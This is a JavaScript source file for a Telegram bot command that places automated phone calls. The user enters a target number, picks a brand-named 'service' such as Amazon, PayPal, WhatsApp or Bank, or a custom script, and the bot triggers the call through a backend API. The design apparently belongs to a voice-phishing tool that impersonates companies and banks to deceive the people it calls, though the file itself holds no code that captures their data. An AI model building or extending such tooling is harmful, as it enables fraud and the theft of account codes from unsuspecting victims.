/**
 * Call command handler for initiating calls
 */

const { Composer } = require('grammy');
const axios = require('axios');
const config = require('../config');
const { getDb } = require('../setup');

const composer = new Composer();

// Command to initiate a call
composer.command('call', async (ctx) => {
  try {
    // Check if user is authorized
    const db = getDb();
    const user = await db.get('SELECT * FROM users WHERE telegram_id = ?', [ctx.from.id]);
    
    if (!user) {
      return ctx.reply('⛔ You are not authorized to use this command.');
    }
    
    // Initialize call session
    ctx.session.callSession = {
      step: 'phone',
      data: {}
    };
    
    return ctx.reply('📱 Please enter the phone number to call (with country code):');
  } catch (error) {
    console.error('Error in call command:', error);
    return ctx.reply('❌ An error occurred while processing your request.');
  }
});

// Handle call flow
composer.on('message', async (ctx, next) => {
  if (!ctx.session.callSession) {
    return next();
  }
  
  const { step, data } = ctx.session.callSession;
  
  try {
    if (step === 'phone') {
      // Save phone number
      const phoneNumber = ctx.message.text.trim().replace(/\s+/g, '');
      
      // Basic validation
      if (!/^\+?[0-9]{10,15}$/.test(phoneNumber)) {
        return ctx.reply('❌ Invalid phone number. Please enter a valid phone number with country code:');
      }
      
      data.phone = phoneNumber;
      ctx.session.callSession.step = 'service';
      
      // Get available scripts
      try {
        const response = await axios.post(`${config.apiUrl}/scripts`, {
          password: config.apiPassword
        });
        
        // Filter call scripts
        const callScripts = response.data.scripts?.filter(script => script.type === 'call') || [];
        
        // Create keyboard with standard services and custom scripts
        const keyboard = [
          [{ text: 'Amazon' }, { text: 'PayPal' }, { text: 'Google' }],
          [{ text: 'Facebook' }, { text: 'Instagram' }, { text: 'Twitter' }],
          [{ text: 'Snapchat' }, { text: 'WhatsApp' }, { text: 'Bank' }],
          [{ text: 'Default' }]
        ];
        
        // Add custom scripts in rows of 3
        if (callScripts.length > 0) {
          const scriptRows = [];
          let currentRow = [];
          
          callScripts.forEach((script, index) => {
            currentRow.push({ text: `Script: ${script.name}` });
            
            if (currentRow.length === 3 || index === callScripts.length - 1) {
              scriptRows.push([...currentRow]);
              currentRow = [];
            }
          });
          
          keyboard.push(...scriptRows);
        }
        
        return ctx.reply('Select a service or custom script:', {
          reply_markup: {
            keyboard,
            resize_keyboard: true,
            one_time_keyboard: true
          }
        });
      } catch (error) {
        console.error('Error fetching scripts:', error);
        
        // Fallback to standard services if API call fails
        return ctx.reply('Select a service:', {
          reply_markup: {
            keyboard: [
              [{ text: 'Amazon' }, { text: 'PayPal' }, { text: 'Google' }],
              [{ text: 'Facebook' }, { text: 'Instagram' }, { text: 'Twitter' }],
              [{ text: 'Snapchat' }, { text: 'WhatsApp' }, { text: 'Bank' }],
              [{ text: 'Default' }]
            ],
            resize_keyboard: true,
            one_time_keyboard: true
          }
        });
      }
    } else if (step === 'service') {
      // Save service
      let service = ctx.message.text.trim().toLowerCase();
      let scriptName = null;
      
      // Check if this is a custom script
      if (service.startsWith('script: ')) {
        scriptName = service.replace('script: ', '');
        service = null;
      } else {
        // Map service names to API service names
        switch (service) {
          case 'amazon':
            service = 'amazon';
            break;
          case 'paypal':
            service = 'paypal';
            break;
          case 'google':
            service = 'google';
            break;
          case 'facebook':
            service = 'facebook';
            break;
          case 'instagram':
            service = 'instagram';
            break;
          case 'twitter':
            service = 'twitter';
            break;
          case 'snapchat':
            service = 'snapchat';
            break;
          case 'whatsapp':
            service = 'whatsapp';
            break;
          case 'bank':
            service = 'banque';
            break;
          default:
            service = 'default';
            break;
        }
      }
      
      data.service = service;
      data.scriptName = scriptName;
      ctx.session.callSession.step = 'confirm';
      
      // Remove keyboard
      const removeKeyboard = {
        reply_markup: {
          remove_keyboard: true
        }
      };
      
      let confirmMessage = `📞 Call Summary:\n\nPhone: ${data.phone}\n`;
      
      if (scriptName) {
        confirmMessage += `Script: ${scriptName}`;
      } else {
        confirmMessage += `Service: ${service}`;
      }
      
      return ctx.reply(confirmMessage, {
        ...removeKeyboard,
        reply_markup: {
          inline_keyboard: [
            [{ text: '✅ Confirm', callback_data: 'call_confirm' }],
            [{ text: '❌ Cancel', callback_data: 'call_cancel' }]
          ]
        }
      });
    }
  } catch (error) {
    console.error('Error in call flow:', error);
    ctx.session.callSession = null;
    return ctx.reply('❌ An error occurred while processing your request.');
  }
  
  return next();
});

// Handle callback queries for call confirmation
composer.on('callback_query', async (ctx) => {
  if (!ctx.session.callSession || ctx.session.callSession.step !== 'confirm') return;
  
  const callbackData = ctx.callbackQuery.data;
  
  try {
    if (callbackData === 'call_confirm') {
      const { data } = ctx.session.callSession;
      
      // Make API call to initiate the call
      try {
        const requestData = {
          to: data.phone,
          password: config.apiPassword
        };
        
        // Add either service or scriptName
        if (data.scriptName) {
          requestData.scriptName = data.scriptName;
        } else {
          requestData.service = data.service;
        }
        
        const response = await axios.post(`${config.apiUrl}/call`, requestData);
        
        ctx.session.callSession = null;
        await ctx.answerCallbackQuery();
        
        if (response.data.success) {
          return ctx.reply(`✅ Call initiated successfully!\nSID: ${response.data.sid}\nStatus: ${response.data.status}`);
        } else {
          return ctx.reply(`❌ Failed to initiate call: ${response.data.error}`);
        }
      } catch (error) {
        console.error('API error:', error.response?.data || error.message);
        await ctx.answerCallbackQuery();
        return ctx.reply(`❌ API Error: ${error.response?.data?.error || 'Unknown error'}`);
      }
    } else if (callbackData === 'call_cancel') {
      ctx.session.callSession = null;
      await ctx.answerCallbackQuery();
      return ctx.reply('❌ Call cancelled.');
    }
  } catch (error) {
    console.error('Error in call callback:', error);
    ctx.session.callSession = null;
    await ctx.answerCallbackQuery();
    return ctx.reply('❌ An error occurred while processing your request.');
  }
});

// Command to cancel ongoing call
composer.command('cancel', async (ctx) => {
  if (ctx.session.callSession) {
    ctx.session.callSession = null;
    return ctx.reply('❌ Call process cancelled.');
  }
  
  return ctx.reply('No active call process to cancel.');
});

module.exports = composer;
